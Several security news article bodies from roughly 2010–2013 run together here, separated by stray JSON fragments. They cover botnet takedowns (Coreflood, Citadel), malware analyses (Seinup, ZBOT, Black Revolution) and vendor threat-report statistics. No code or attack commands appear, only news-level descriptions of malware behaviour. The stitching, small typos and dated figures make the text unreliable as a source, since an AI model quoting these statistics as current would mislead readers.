temporary restraining order (TRO), giving it the ability to communicate with infected computers in the United States in order to stop the Coreflood malware from running, essentially remotely disinfecting it. Following the issuance of the temporary restraining order, the Department of Justice and the FBI, working with Internet service providers around the country, is working to identify victims who have been infected with Coreflood. Identified owners of infected computers will also be told how to “opt out” from the remote disinfection, if they really feel that they want to keep Coreflood running on their systems. The Department of Justice said law enforcement authorities will NOT be able access any information stored on an infected systems. Dutch authorities took a different approach during the takedown of the Mariposa botnet, and didn’t give victims the opportunity to “opt out” from the remote disinfection. According to Derek Manky, a threat researcher from Fortinet, “Dutch authorities forcibly sent ‘goodware’ and sent an executable to update infected machines.” Dave Marcus, McAfee Labs research and communications director, believes the group behind coreflood had been quite successful in their efforts over the years. “It appears the cybercriminals behind Coreflood were able to turn the botnet into a money making machine,” Marcus said. “It is hard to estimate the actual loot, but the criminals likely made tens of millions of dollars, based on the estimates in the complaint filed by the Department of Justice. It is not outside of the realm of possibility that they netted more than US$100 million.\" The Department of Justice noted that while the enforcement action completely disabled the existing Coreflood botnet by seizing control from the criminals who ran it, this does not mean that Coreflood malware or similar forms of malware have been removed from the Internet entirely. Nor does it mean that criminals will not attempt to build another botnet using a different version of the Coreflood malware or other malware. The law enforcement actions are the result of an ongoing criminal investigation by the FBI’s New Haven Division, in coordination with the U.S. Marshals Service with assistance provided by Microsoft, the Internet Systems Consortium and other private industry partners. “We commend the FBI and DOJ for their action against the Coreflood botnet,” Richard Boscovich, Senior Attorney, Microsoft Digital Crimes Unit told SecurityWeek. “There is clearly a strong public/private momentum happening in the fight against botnets and the Microsoft Digital Crimes Unit was happy to provide technical information from the lessons we learned from the recent Rustock and Waledac botnet takedowns to assist these agencies in their operation.” " }

Connecting the malicious server via Google Docs, offers the malicious communication the protection provided by the legitimate SSL offered by Google, explained FireEye researcher Chong Rong Hwa. \"One possible way to examine the SSL traffic is to make use of a hardware SSL decrypter within an organization,\" the researcher noted. \"Alternatively, you may want to examine the usage pattern of the users. Suppose a particular user accesses Google Docs multiple times a day, the organization’s Incident Response team may want to dig deeper to find out if the traffic is triggered by a human or by malware.\" According to FireEye, the campaign uses on spear-phishing attacks targeting countries such as Laos, Singapore and Cambodia. The document used in this attack exploits CVE-2012-0158, and creates a decoy document and a malware dropper named exp1ore.exe, blogged Chong Rong Hwa, a researcher at FireEye. This dropper will then drop wab.exe and wab32res.dll inside the temp folder. By running wab.exe, the malicious DLL will be loaded. This will in turn install a copy of wab32res.dll as msnetrsvw.exe inside the Windows directory to be registered as a Windows service. By doing so, it allows the malware to survive reboot and persist on the network, according to the researcher. The malware has been dubbed “Trojan.APT.Seinup” because one of its export functions is named “seinup”. If infected, the malware creates a backdoor on the system and gives the attacker remote control over the victim's computer. In addition, the malware is armed with a number of cryptographic functions to perform some of its functions securely. On the disk, the malicious code is either encrypted or compressed as a means to dodge scanning using signatures. Only upon being loaded into memory does the malicious code get manually loaded without the use of Windows 32 API, according to the researcher. This helps hide the malicious DLL in the event the malware is analyzed. \"It is important to put a stop to the malware infection at the very beginning, which is the exploitation phase,\" he blogged. \"Once a network is compromised, it is increasingly harder to detect such threats.\" " }

Trusteer offered no information about how the victims were initially getting infected with Zeus. However, a common infection vector for Zeus is a drive-by infection on a compromised site. \"While HTML injection is typically used for adding data fields or to present bogus messages, in this case we witnessed a rare usage that attempts to divert the victim to a fake job offering,\" blogged Etay Maor, fraud prevention solutions provider at Trusteer. \"Because this redirection occurs when the victim is actively pursuing a job, in this case with CareerBuilder [dot] com, the victim is more likely to believe the redirection is to a legitimate job opportunity.\"  It is hardly unheard of for cybercriminals to use legitimate employment websites to recruit mules. Typically, Maor explained, this would take the form of criminals creating a job opening looking for financial managers. \"The ads would include enticing descriptions of easy money from simple “work-at-home” jobs, luring job seekers to contact the “employer” to unknowingly serve as the money laundering component of a cybercrime gang,\" the researcher blogged. Just this week, federal authorities in the U.S. charged eight people for being part of a money laundering operation that was involved in the attempted theft of $15 million from banking customers in the U.S. Recognizing their sites can be abused for recruiting mules for these kinds of operations, employment websites have taken to offering easy ways for users to report suspicious ads, Maor continued. In addition, affected sites have created security teams that use a combination of manual and automatic search techniques to detect and remove such ads. \"Malware authors, on the other hand, recognize that job seekers who actively access employment websites have a high potential to be successfully recruited and serve as money mules,\" Maor observed. \"By using CareerBuilder as a platform, the Zeus operators maximize their outreach to potential mule targets,\" he added.

The report showed not only a dramatic increase in frequency of threats, but also an increase in sophistication of targeted attacks on enterprises. Additionally, the report shows that targeted attacks such as Hydraq and Stuxnet posed a growing threat to enterprises in 2010. To increase the likelihood of successful, undetected infiltration into the enterprise, an increasing number of these targeted attacks leveraged zero-day vulnerabilities to break into computer systems. As one example, Stuxnet alone exploited four different zero-day vulnerabilities to attack its targets. \"Stuxnet and Hydraq, two of the most visible cyber-events of 2010, represented true incidents of cyberwarfare and have fundamentally changed the threat landscape,\" said Stephen Trilling, senior vice president, Symantec Security Technology and Response. \"The nature of the threats has expanded from targeting individual bank accounts to targeting the information and physical infrastructure of nation states.\" In 2010, attackers launched targeted attacks against a diverse collection of publicly traded, multinational corporations and government agencies, as well as a surprising number of smaller companies. In many cases, the attackers researched key victims within each corporation and then used tailored social engineering attacks to gain entry into the victims' networks. Due to their targeted nature, many of these attacks succeeded even when victim organizations had basic security measures in place. While the high-profile targeted attacks of 2010 attempted to steal intellectual property or cause physical damage, many targeted attacks preyed on individuals for their personal information. For example, the report found that data breaches caused by hacking resulted in an average of more than 260,000 identities exposed per breach in 2010, nearly quadruple that of any other cause. Key Facts and Figures from Symantec’s Internet Security Threat Repor, Volume 16  •\t286 million new threats -- Polymorphism and new delivery mechanisms such as Web attack toolkits continued to drive up the number of distinct malware programs. In 2010, Symantec encountered more than 286 million unique malicious programs. •\t93 percent increase in Web-based attacks -- Web attack toolkits drove the 93 percent increase in the volume of Web-based attacks in 2010. The use of shortened URLs also impacted this increase. •\t260,000 identities exposed per breach -- This is the average number of identities exposed per breach in data breaches caused by hacking during 2010. •\t14 new zero-day vulnerabilities -- Zero-day vulnerabilities played a key role in targeted attacks including Hydraq and Stuxnet. Stuxnet alone used four different zero-day vulnerabilities. •\t6,253 new vulnerabilities -- Symantec documented more vulnerabilities in 2010 than in any previous reporting period. •\t42 percent more mobile vulnerabilities -- In a sign that cybercriminals are starting to focus their efforts on the mobile space, the number of reported new mobile operating system vulnerabilities increased, from 115 in 2009 to 163 in 2010. •\tOne botnet with more than a million spambots -- Rustock, the largest botnet observed in 2010, had more than one million bots under its control at one point during the year. Other botnets such as Grum and Cutwail followed with many hundreds of thousands of bots each. •\t74 percent of spam related to pharmaceuticals -- Nearly three quarters of all spam in 2010 was related to pharmaceutical products--a great deal of which was related to pharmaceutical websites and related brands. •\t$15 per 10,000 bots -- Symantec observed an advertisement that listed the price for 10,000 bot-infected computers as $15 on an underground forum in 2010. Bots are typically used for spam or rogueware campaigns, but are increasingly also used for DDoS attacks. •\t$0.07 to $100 per credit card -- The price for credit card data on underground forums ranged widely in 2010. Factors dictating prices include the rarity of the card and discounts offered for bulk purchases. Social network platforms continue to grow in popularity and this popularity has not surprisingly attracted a large volume of malware. One of the primary attack techniques used on social networking sites involved the use of shortened URLs. Under typical, legitimate, circumstances, these abbreviated URLs are used to efficiently share a link in an email or on a web page to an otherwise complicated web address. Last year, attackers posted millions of these shortened links on social networking sites to trick victims into both phishing and malware attacks, dramatically increasing the rate of successful infection. The report found that attackers overwhelmingly leveraged the news-feed capabilities provided by popular social networking sites to mass-distribute attacks. In a typical scenario, the attacker logs into a compromised social networking account and posts a shortened link to a malicious website in the victim's status area. The social networking site then automatically distributes the link to news feeds of the victim's friends, spreading the link to potentially hundreds or thousands of victims in minutes. In 2010, 65 percent of malicious links in news feeds observed by Symantec used shortened URLs. Of these, 73 percent were clicked 11 times or more, with 33 percent receiving between 11 and 50 clicks. Attack Toolkits Focus on Java  In 2010, attack toolkits, software programs that can be used by novices and experts alike to facilitate the launch of widespread attacks on networked computers, continued to see widespread use. These kits increasingly target vulnerabilities in the popular Java system, which accounted for 17 percent of all vulnerabilities affecting browser plug-ins in 2010. As a popular cross-browser, multi-platform technology, Java is an appealing target for attackers. The Phoenix toolkit was responsible for the most Web-based attack activity in 2010. This kit, as well as many others, incorporates exploits against Java vulnerabilities. The sixth highest ranked Web-based attack during the reporting period was also an attempt to exploit Java technologies. The number of measured Web-based attacks per day increased by 93 percent in 2010 compared to 2009. Since two-thirds of all Web-based threat activity observed by Symantec is directly attributed to attack kits, these kits are likely responsible for a large part of this increase. Mobile Threat Landscape Comes Into View  The major mobile platforms are finally becoming ubiquitous enough to garner the attention of attackers, and as such, Symantec expects attacks on these platforms to increase. In 2010, most malware attacks against mobile devices took the form of Trojan Horse programs that pose as legitimate applications. While attackers generated some of this malware from scratch, in many cases, they infected users by inserting malicious logic into existing legitimate applications. The attacker then distributed these tainted applications via public app stores. For example, the authors of the recent Pjapps Trojan employed this approach. While the new security architectures employed in today's mobile devices are at least as effective as their desktop and server predecessors, attackers can often bypass these protections by attacking inherent vulnerabilities in the mobile platforms' implementations. Unfortunately, such flaws are relatively commonplace -- Symantec documented 163 vulnerabilities during 2010 that could be used by attackers to gain partial or complete control over devices running popular mobile platforms. In the first few months of 2011 attackers have already leveraged these flaws to infect hundreds of thousands of unique devices. " }

According to GFI Software, a trend observed since last summer continued, with many of the same types of Trojan horses continuing to dominate the threat landscape. GFI’s statistics revealed that Trojans made up six of the top 10 malware threats in February 2011. Topping the list, Trojans detected as Trojan.Win32.Generic!BT accounted for 22.97 percent of total detections, holding its spot as the number one threat. These Trojans are downloaders associated with rogue security programs known as Fake Antivirus software, sometimes referred to as “scareware”. Once they are on a user’s system, these programs perform a fake scan of a victim’s computer for malware then display false warnings that the machine is infected in an attempt to convince victims to purchase fake security software.

According to Trend Micro, researchers have discovered a new version of the ZBOT that is self-propagating. This is a new trick for ZBOT, which typically spreads through drive-by downloads that occur when users visit sites compromised to host exploit kits serving the malware. \"This particular ZBOT variant arrives through a malicious PDF file disguised as a sales invoice document,\" blogged Abigail Pichel of Trend Micro. If the user opens the file with Adobe Reader, it triggers an exploit that causes a pop-up window appear. \"While this is going on, the malicious ZBOT variant – WORM_ZBOT.GJ – is dropped onto the system and run. It is here that several differences start to appear,\" Pichel explained. \"First of all, WORM_ZBOT.GJ has an autoupdate routine: it can download and run an updated copy of itself. Secondly, however, it can spread onto other systems via removable drives, like USB thumb drives. It does thus by searching for removable drives and then creating a hidden folder with a copy of itself inside this folder, and a shortcut pointing to the hidden ZBOT copy.\" In February, Trend Micro observed an increase in ZBOT samples. The surge in new infection attempts continued through at least May 7. The new propagation technique is unusual for ZBOT, Pichel noted, and could mean an increase in ZBOT infections moving forward. \"This unusual behavior, however, is in line with our2013 predictions, which noted that we believed that older threats would continue to be seen in 2013, although they would have refinements to make them more effective. In the past, some ZBOT variants have used unusual means – like file infectors - to spread as well,\" she blogged.  " }

The McAfee Threats Report: Fourth Quarter 2010, also revealed that the number of pieces of new mobile malware in 2010 increased by 46 percent compared with 2009, noting that McAfee uncovered 20 million new pieces of malware in 2010, equating to nearly 55,000 new malware threats every day. In August, security firm Sophos reported that in first half of 2010, it received an average of 60,000 new malware samples every day, about 1 every 1.4 seconds. Of the almost 55 million total pieces of malware McAfee Labs has identified, 36 percent was created in 2010. Threats to mobile platforms aren't new. However, as more consumers use mobile devices and tablets in their daily lives and at work, cybercriminals have taken note. During the last several years, McAfee Labs has seen a steady growth in the number of threats to mobile devices. Some of the most interesting mobile threats of Q4 2010 were SymbOS/Zitmo.A and Android/Geinimi. SymbOS/Zitmo.A was a high-profile threat that struck early in the quarter. The creators of the Zeus botnet repurposed an old version of a commercial spyware package. Android/Geinimi, a Trojan inserted into legitimate mobile applications and games for the Android platform, was one of the most important threats of the quarter. With the adoption of so many new mobile platforms, combined with the lack of security awareness and mobile safeguards, McAfee Labs expects cybercriminals to use botnet infections to target mobile devices. In Q4 2010, Cutwail was dethroned as the global leader in botnet activity, with Rustock the most prevalent in many parts of the world, and Bobax closely trailing behind the two. “Our Q4 Threats Report shows that cybercriminals are keeping tabs on what’s popular, and what will have the biggest impact from the smallest effort,” said Vincent Weafer, senior vice president of McAfee Labs. “In the past few quarters, malware trends have been very similar in different geographies, but in the last quarter we’ve seen a significant shift in various regions, showing that cybercriminals are tapped in to trends worldwide. McAfee Labs also sees the direct correlation between device popularity and cybercriminal activity, a trend we expect to surge in 2011.” Malware on the Rise; Spam in a “Transition Period” The onslaught of malware seems to have no end, and the proliferation of both handled and IP-enabled devices’ affect on this growth remains to be seen. The top malware threats in Q4 2010 were very different in various geographies, due in part to the larger trend that threats now tend to match the types of users, habits and events that are specific to a region. Favorites for cybercriminals worldwide this quarter consisted of AutoRun malware (Generic!atr), banking Trojans and downloaders (PWS or Generic.dx), as well as web-based exploits (StartPage and Exploit-MS04-028). McAfee also report that spam accounted for 80 percent of total email traffic in Q4 2010, the lowest point since the first quarter of 2007. Symantec recently reported that it was seeing spam levels at the lowest rate since March 2009, when the global spam rate was 75.7 percent of all email traffic, according to its January 2011 MessageLabs Intelligence Report released last month. McAfee suggests that spam levels hitting the lowest levels in years can be attributed to a “transition period,” with several botnets going dormant during a time of year when spam volumes are usually on an upward path. In Q4, McAfee Labs learned the Bredolab botnet had been closed along with parts of the Zeus botnet. Around the Christmas holiday, spam from the Rustock, Lethic, and Xarvester botnets all disappeared, while the spam leaders this quarter were the Bobax and Grum botnets. More Devices Mean More Web Threats  As more users access the Internet from an ever-expanding pool of devices—computer, tablet, smartphone or Internet TV—web-based threats will continue to grow in size and sophistication. In December, security researchers from Mocana discovered several security flaws in one of the best-selling brands of Internet-connected HDTVs. Mocana was able to demonstrate that JavaScript could be injected into the normal datastream, allowing attackers to obtain total control over the device's Internet functionality, and believe it’s likely that similar security flaws exist in other Internet TVs. In Q4, some of the most active threats included Zeus-Murofet, Conficker and Koobface, and the number of potentially malicious domains grew at a rapid pace. Phishing URLs in the form of the IRS, gift cards, rewards accounts, and social networking accounts were also among the most popular. McAfee Labs found that within the top 100 results of the top daily search terms, 51 percent led to malicious sites, and on average each of these poisoned results pages contained more than five malicious links. McAfee Labs expects attacks using the techniques of search-engine abuse and trend abuse to focus more specifically on new types of devices in 2011. Adobe Product Vulnerabilities are Top Distribution Method of Choice for Cybercriminals In 2009, McAfee Labs predicted that vulnerabilities in Adobe product would become the clear choice of malware authors and cybercriminals for distribution malware and compromising systems and networks. This prediction has come true. Throughout 2010 malware developers have heavily exploited weaknesses in both Flash and especially PDF technologies. McAfee Labs databases reveal that malicious PDFs targeting Adobe Acrobat topped the number of unique samples by a wide margin, making them the favorite target of client-side exploitation. McAfee Labs is certain that the “Adobe” trend will continue this year, as more mobile devices and non-Microsoft operating systems support various Adobe technologies. " }

Damballa observed a five-fold increase in the number of malware samples using p2p to communicate with command-and-control infrastructure in the last 12 months, the company found in its report, released Thursday. Several of the latest malware variants, including ZeroAccess, TDL v4, and Zeus v3, already have p2p capabilities to evade detection by existing security products, the report said. While enterprises may attempt to shut down p2p activity, there are legitimate applications that use p2p, such as Skype and Spotify. P2P is no longer about illegal file-sharing. The widespread acceptance of p2p applications is \"ushering in an increase in P2P-based malware,\" Damballa said. By using p2p to contact the C&C servers, criminals can ensure that their malicious traffic doesn't raise any flags as it passes through the network and bypasses traditional network defenses. \"With P2P, we are seeing advanced threats being able to adapt to changing environments,\" said Brian Foster, CTO of Damballa. Similar to how malware authors have come up with new programmatic techniques to evade antivirus and other security scanners, cyber-criminals are adopting new techniques to hide the traffic flowing between the infected machine and the control servers, the report found. By using a decentralized model, where infected \"peers\" act as a server and host to each other, criminals now have an \"indestructible communication structure that cannot be easily discovered,\" Damballa wrote in its report. \"Threat actors have taken note of the broader adoption of P2P, as well as P2P’s lack of a centralised control infrastructure, which provides resilience to take down,\" said John Jerrim, senior research scientist at Damballa. P2P slows down communications to infected machines, but it makes the operation much more resilient. Even if the top server is knocked offline, other machines can still communicate with the infected machine until a new master server comes back online to resurrect the campaign. While ZeroAccess and Zeus use p2p as their primary means of communications, TDL4 uses p2p as a fallback mechanism if direct C&C communications are blocked, the report found. Along with the report, Damballa announced that it has added P2P Profiler to its Damballa Failsafe platform to discover and analyze p2p communications. Damballa Failsafe performs flow analysis on egress traffic and uses machine-learning algorithms to classify p2p traffic on the network as benign or malicious. Failsafe can also pinpoint which endpoint is the originator of the malicious p2p traffic. " }

BitTorrent is the most frequently used P2P application globally, according to the 6th Edition of Application Usage and Risk Report from Palo Alto Networks. When these applications go unmonitored, they do pose certain business and security risks such as introduction of malware leading to data loss, downtime and the possibility of direct financial losses. The Virus Guard app, powered by BitDefender, scans all torrent files to help protect against malware. Available in the new BitTorrent App Studio, Virus Guard operates as a standalone security app that's incorporated into the BitTorrent and µTorrent clients to scan downloads once they're completed.  The Catch - If malware is detected, the app flags the offending torrent and prompts users to sign up for a free trial of BitDefender's security suite and remove the threat or the user can rescan their computer system using their existing antivirus solution. BitDefender’s Internet Security Suite Products range from $49.95 Per year for up to 3 PCs, to $79.95 for its “Total Security 2011” solution. \"BitTorrent is a powerful and increasingly popular way for users to exchange content they value. Its increasing popularity has made third-party hosting sites a target for malware authors to try to infect users' systems. By partnering with BitTorrent, we're able to protect users proactively from malware and other e-threats before they are able to infect users' computers,\" said Peter Laakkonen, BitDefender's general manager of OEM and technology licensing.  While adding a layer of protection to BitTorrent is a good step, users actively downloading files from many untrusted sources will still be far from safe.

Botnets are networks of compromised computers infected by malware and remotely controlled by command-and-control servers. In the case of Citadel, the criminals in charge, known as botherders, took a copy of the Citadel malware and built out their own personal botnets, each with their own personal army of zombie computers. Microsoft filed a civil suit against unnamed individuals operating these independent operations in the U.S. District Court for the Western District of North Carolina last week. The court granted Microsoft's request to \"simultaneously cut off communication\" between the command-and-control servers and the millions of infected machines under their control. On June 5, Microsoft, escorted by U.S. Marshalls, seized data and evidence from these operations, including servers from two data hosting facilities in New Jersey and Pennsylvania. \"Creating successful public-private relationships—in which tools, knowledge, and intelligence are shared—is the ultimate key to success in addressing cyber threats and is among the highest priorities of the FBI,\" Richard McFeely, the executive assistant director at the FBI, said in a statement. This action disrupted operations for 1,462 botnets, Microsoft said. However, Microsoft and its partners aren't under the impression that they would be able to \"fully eliminate\" all of the botnets using Citadel. The goal is to \"significantly disrupt\" operations, making it \"riskier and more expensive for the cybercriminals to continue doing business,\" Microsoft said. The problem remains, because the criminals will just move the Citadel code from one place to another, Jason Steer, EMEA product manager at FireEye, told SecurityWeek. \"The worry is that there are hundreds, if not thousands, of other Citadel and Zeus variants in the wild and so the threat posed to online banking users is only marginally reduced by this takedown,\" Steer said. Citadel had keylogging capabilities, which enabled cybercriminals to intercept the victim's account credentials for online banking and other sensitive websites. This meant criminals could easily withdraw money from bank accounts or steal personal identities. The botnets combined were responsible for over half a billion dollars in financial fraud and affected more than five million people in over 90 ninety countries, Microsoft said. Countries with the highest number of infections were the United States, Europe, Hong Kong, Singapore, India, and Australia. \"The harm done by Citadel shows the threat that botnets, malicious software, and piracy pose to individuals and businesses around the world,\" said Brad Smith, Microsoft general counsel and executive vice-president of Legal and Corporate Affairs. Microsoft also provided information about the botnet operations to Computer Emergency Response Teams in other countries so that they could take action on additional command-and-control infrastructure within their borders. The FBI also provided information to its foreign law enforcement counterparts. \"We will use the intelligence gained from this operation to work against the international criminal enterprises conducting these operations, thereby helping to make the Internet safer for people and businesses worldwide,\" McFeely said. Victims need to remove the Citadel malware from their computers as soon as possible to ensure they don't wind up with additional security issues, Microsoft said. Microsoft will use the threat intelligence gathered during the seizure to work with internet service providers and CERTs to notify users who have been infected. The information will be made available through its Cyber Threat Intelligence Program. Microsoft's partners in the financial services industry included the Financial Services-Information Sharing and Analysis Center (FS-ISAC), NACHA-Electronic Payments Assocation, and the American Bankers Association. Agari, A10 Networks, and Nominum also worked with Microsoft and the Federal Bureau of Investigation in this effort. The investigation began in early 2012, according to Microsoft. FS-ISAC performed forensics analysis on the terabytes of email data collected by Agari, and Nominum and A10 provided advanced networking capabilities. \"We must ensure that, as cyber policy is developed, the ability of the private sector to coordinate in real time with the FBI is encouraged so that a multi-prong attack on our cyber adversaries can be as effective as possible,\" McFeely said.

The group’s mission is to create publicly vetted, objective and credible criteria to test and certify endpoint security products against, as well as educate end users about endpoint products. Additionally, consortium plans to evaluate endpoint security products (including anti-malware, personal firewall and host intrusion prevention and detection) as components of integrated Internet security programs, something traditionally done on an individual basis. \"With such a broad range of products touching endpoint security, it is important that the industry pulls together to create consistency among these products to form an effective barrier against this class of threat,\" said Andrew Hayter, anti-malcode program manager of ICSA Labs. \"The creation of objective testing criteria will create a bar against which endpoint security products will be measured. As part of its charter, the consortium will also advance knowledge and best practices for endpoint security.\" The consortium's charter members include AVG, McAfee and Microsoft Corp. \"McAfee looks forward to participating in the new ICSA Labs Endpoint Security Consortium and collaborating with the testing lab to drive endpoint security standards,\" said Suresh Subramanian, senior product manager at McAfee. \"As a leading security provider, McAfee is pleased to see the industry work together to develop more real-life-type testing and evaluation standards that help customers choose the right products for their unique environments.\" The consortium is currently working on the draft criteria that ICSA Labs is proposing to use for endpoint security product certification testing. Once the criteria are accepted by the consortium members, ICSA Labs will begin accepting products into endpoint security certification testing. Earlier this month, Verizon’s RISK Team and ICSA Labs announced the “VERIS community Web site,” a crowd-sourced collection of data breach incidents. Using the site, organizations and individuals can share their data by using an online application for collecting, classifying, analyzing and comparing security incident information.

The malware, dubbed 'Black Revolution', has been spotted attacking sites in the U.S., Russia, Germany and several other nations since April. According to researchers at Arbor Networks, popular targets have included gambling sites, hacking forums and DDoS-as-a-service providers. \"Compared to popular DDoS botnets like Dirtjumper and Yoyoddos, Blackrev is still small,\" Dennis Schwarz, security research analyst for ASERT, Arbor Security Engineering Research Team, told SecurityWeek. \"Since we started monitoring this botnet in late April, we've seen seven distinct [command and control] domains. Out of these, four have issued attack commands.\" According to Schwarz, there are four revisions to the malware in the wild today, of which version two is the most popular. A technical analysis of each of the revisions is available here. \"I would consider all of the revisions at a \"medium\" sophistication level,\" he said. \"There are a lot of common components we see in other malware that are missing from Blackrev: packed binaries, anti-debug/anti-virtual machine, and obfuscation/crypto.\" According to DDoS mitigation provider Prolexic Technologies, the bandwidth of DDoS attacks generally has jumped significantly this year. In its Quarterly Global DDoS Attack Report, the average attack bandwidth totaled 48.25 Gbps in the first quarter of 2013, a 718 percent increase over the fourth quarter of 2012. In a survey of 130 network operators released earlier this year, Arbor Networks found that 46 percent reported multi-vector attacks that use combinations of volumetric, state-exhaustion and application-layer attack vectors to hit organizations at the same time. The attacks pose challenges because they require layered solutions across the data center and the cloud to be mitigated successfully. In the previous year's report, only 27 percent of respondents reported these attacks. Though Black Revolution Trojan has been revised multiple times by its authors, the reason for the changes does not seem to be selling the malware on the open market, as the onthar.in Malware Research Laboratory reported that it has not been seen being sold on underground forums yet. According to Schwarz, there were signs circa April 2013 that the code was under active development, and the associated campaigns were likely test runs. \"Based on the Delphi usage, command and control locations, and the language references in some of the HTTP headers, the nationality of this family is empirically Russian,\" blogged Schwarz. \"But, as with all malware attribution, this is highly speculative. It is also unclear whether a single threat actor has access to the source code or whether the code has been released or leaked and multiple actors are making modifications.\" \"It will be interesting to see how this family will evolve and how active it will become in the wild,\" he added.

With the goal of replacing the common SSL encryption protocol used by many Web sites with its new Application Secure Layer (ASL) Protocol, the company may now be one step closer to its goal. Federated Networks this week announced that the BT Ethical Hacking Center confirmed that Federated Networks’ ASL protocol eliminates pervasive vulnerabilities inherent in the known limitations and weaknesses of current SSL implementations.  In independent testing, Federated Networks’ ASL protocol thwarted network-centric security attacks such as phishing, pharming, DNS Poisoning, and proxying, or more generally all forms of man-in-the-middle (M-I-M) attacks. Federated Networks claims its ASL protocol is materially more secure than existing SSL implementations that are common today. The company says that this testing is the first in a series of ethical hacking vulnerability assessments that will be performed by BT’s Ethical Hacking Center to its “FN Connect Secure Architecture,” designed to help consumers, enterprises and governments be secure. Federated Networks says its solutions effectively immunize users from broad classes of known attack vectors on systems and data by adding a “Neutralize” layer to the existing layered software security model of “Prevent, Detect, Monitor and Recover.” BT’s tests help validate this claim. The second and third elements of BT’s testing related to the FN Connect Secure Architecture, namely the vulnerability testing of the FN Connect Secure Client and Agent, are expected to be finalized in the next 30 days. The company plans to unveil additional details on other component of its FN Connect Securely initiatives in the coming months. " }

According to reports, enStage processed card payments for the Bank of Muscat in Oman, which lost $40 million in February when gang members looted ATMs around the world using compromised card data.  In the case of ElectraCard Services [ECS], the compromise of their organization contributed to a heist that ultimately resulted in $5 million in losses. \"As the popularity of payment cards, online, and digital service channels in banking and finance has grown, so to have the risks of cyber-attacks,\" said Torsten George, vice president worldwide marketing, products, and support for Agiliance. \"These industries are prime targets for advanced persistent threats (APTs), since, as the famous saying goes, 'that’s where the money is'.\" ElectraCard Services was attacked in December of 2012, and handled transactions for prepaid MasterCard debit cards issued by the National Bank of Ras Al-Khaimah PSC in the United Arab Emirates. In the attack, the gang compromised prepaid card accounts and changed the account balances and withdrawal limits. Afterwards, groups of individuals known as \"cashers\" used cards encoded with fraudulent card information to withdraw money from ATMs, including nearly $400,000 at more than 140 different ATMs in the New York City area. In a statement, ECS said that it has engaged external agencies such as Verizon to do forensic and other investigations, and has contacted the U.S. Secret Service. The investigations revealed that the PIN and magnetic stripe data used by the gang was stolen from elsewhere, the company said.   \"As part of the standard process under such circumstances in the 3rd party payments processing industry, ECS is in the process of re-certifying and re-listing itself for compliance with the PCI-DSS standards of the PCI Security Standards Council (whose certifications are recognized by international payment associations such as Visa and MasterCard),\" the company said in a statement. \"ECS has already taken several measures to further strengthen its processing environment and is confident of being re-certified and re-listed over the next couple of months.\" The rising tide of insider and advanced persistent threats, mounting regulatory pressure and the impact of big security data on an organization’s operational efficiency can be overwhelming, said George. \"This holds especially true for organizations that cannot afford to spend millions on shoring up their defenses, hiring cyber security experts, or assigning a legion of resources to piece together data from different sources, connect the dots, and detect suspicious patterns that would indicate a cyber-attack or data breach,\" he said. \"Thus, smaller payment processors are definitely facing a tougher challenge to stand up to APTs compared to their bigger brothers. However, Information Security Risk Management (ISRM) systems can help even smaller processors beat the hackers.\" In addition to the seven people arrested by authorities in the U.S., two Dutch citizens were arrested by police in Germany in February when they were allegedly caught withdrawing 170,000 euros ($220,500) using Bank of Muscat credit cards.

The researchers are also saying that the latest tactics have moved to a political -- and nationalistic – stage, and that 2011 will bring blended threats and data loss over the Web that demonstrate the potential for targeted cyberterrorism attacks.  These conclusions come from the Websense 2010 Threat Report, and are based on the analysis of Websense Security Labs researchers, who rely on the ThreatSeeker Network, which every hour scans more than 40 million websites for malicious code and nearly 10 million emails for unwanted content and malicious code. The report emphasizes that in today's threat landscape, legacy defenses simply don't work. We all have antivirus, firewalls and proxies installed, but that isn't enough. Threats are no longer binary files delivered in attachments, they are script-based attacks and they are embedded in rich media like Flash. And many spread rapidly on the social Web. Reputation filters provide zero security for threats delivered via top \"legitimate\" websites like Google, Facebook, and YouTube, where 80 percent of Web traffic goes. Cybercriminals know that legacy technology simply looks for known information (signatures) or reputation of previously identified threats, which is why they are so successful at exploiting existing defenses. Most of today's blended attacks are considered \"zero-day,\" in that they have not been previously identified. They are ever-evolving and pre-tested by cybercriminals on common anti-virus products before they are released. These threats sail through firewalls and open channels. Cybercriminals and business leaders have quickly come to realize that data is the newest form of global currency.  “Email brings the problem to your doorstep and 75% of the time AV will let it in for dinner. This is why more advanced security analytics are required than just signatures,” said Jon Crotty, Websense Research Marketing Manager. \"The continued rise of organized cybercriminal gangs and the emergence of targeted advanced malware threats are the most concerning trend we've seen,\" said Dan Hubbard, chief technology officer, Websense. \"Security needs to move ahead of the attackers and focus on contextual classification in order to thwart them. Simple binary access controls and castle and moat security will not solve the complex attacks we see today.” Modern blended threats such as Aurora, Stuxnet, and Zeus infiltrate organizations through a variety of coordinated tactics, usually a combination of two or more. Phishing, compromised websites, and social networking are carefully coordinated to steal confidential data, because in the world of cybercrime, content equals cash. In 2010, cybercriminals adapted their strategies to address the social websites and sites with dynamic user-generated content. Attacks are now more blended, sophisticated, and targeted. Many of these attacks use new tricks and methods of delivery. Script-based attacks, blended email campaigns, and SEO poisoning were all common in 2010. Even the most easily detected threats and botnets were successfully repurposed with variations that often allow them to slip through outdated defenses. The majority of attacks in 2010 focused on the same thing: stealing data. Significant findings from the Websense 2010 Threat Report affirm that while broad threats continue, focused, targeted attacks are on the rise.  Key Findings include:  •\t111.4 percent increase in the number of malicious websites from 2009 to 2010 •\t79.9 percent of websites with malicious code were legitimate sites that have been compromised •\t52 percent of data-stealing attacks were conducted over the Web •\t34 percent of malicious Web/HTTP attacks included data-stealing code •\t89.9 percent of all unwanted emails in circulation during this period contained links to spam sites and/or malicious websites •\t23 percent of real-time search results on entertainment lead to a malicious link •\t40 percent of all Facebook status updates have links and 10 percent of those links are either spam or malicious \"Whether it is your company's sensitive financial information, your social networking, or online banking credentials, that content has tremendous value,\" said Devin Redmond, vice president of Business Development, Product Management and Marketing, Websense. The report concludes that data loss prevention solutions are no longer a “nice to have” option but should be considered a core requirement, and real world examples of situations like WikiLeaks highlight this. Real-time social networking sites will continue to dominate the landscape, the report says. Hackers will continue to mix social engineering tricks with modern blended threats making the Web more complicated than ever before. The continued consumerization of mobile devices such as iPhones and Android devices and the increasing amounts of financial data that touch these devices make them ripe future targets. The report also warns that mobile applications will open the door for unintended security vulnerabilities.

